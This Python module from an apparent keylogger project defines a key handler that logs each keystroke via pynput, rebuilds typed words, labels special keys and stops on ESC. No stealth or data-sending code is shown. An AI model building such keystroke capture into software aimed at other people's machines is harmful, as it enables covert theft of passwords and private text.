# keylogger/handlers.py
from pynput import keyboard

class KeyHandler:
    def __init__(self):
        self.current_word = ""
        self.key_count = 0

    def process_key(self, key):
        """
        Process a key press.
        Returns: (log_entry, completed_word, should_stop)
        """
        try:
            # Normal character
            char = key.char
            self.key_count += 1
            self.current_word += char
            return char, None, False
        except AttributeError:
            # Special key
            key_name = self._get_key_name(key)
            self.key_count += 1

            # Handle special keys with word completion
            if key == keyboard.Key.space:
                word = self.current_word
                self.current_word = ""
                return "[SPACE]", word, False
            elif key == keyboard.Key.enter:
                word = self.current_word
                self.current_word = ""
                return "[ENTER]", word, False
            elif key == keyboard.Key.tab:
                word = self.current_word
                self.current_word = ""
                return "[TAB]", word, False
            elif key == keyboard.Key.backspace:
                if self.current_word:
                    self.current_word = self.current_word[:-1]
                return "[BACKSPACE]", None, False
            elif key == keyboard.Key.esc:
                word = self.current_word
                self.current_word = ""
                return "[ESC]", word, True
            else:
                # Other special keys (no word completion)
                return key_name, None, False

    def _get_key_name(self, key):
        special_keys = {
            keyboard.Key.shift: "[SHIFT]",
            keyboard.Key.shift_r: "[SHIFT_R]",
            keyboard.Key.ctrl_l: "[CTRL]",
            keyboard.Key.ctrl_r: "[CTRL_R]",
            keyboard.Key.alt_l: "[ALT]",
            keyboard.Key.alt_r: "[ALT_R]",
            keyboard.Key.caps_lock: "[CAPS_LOCK]",
            keyboard.Key.delete: "[DELETE]",
            keyboard.Key.home: "[HOME]",
            keyboard.Key.end: "[END]",
            keyboard.Key.page_up: "[PAGE_UP]",
            keyboard.Key.page_down: "[PAGE_DOWN]",
        }
        return special_keys.get(key, str(key))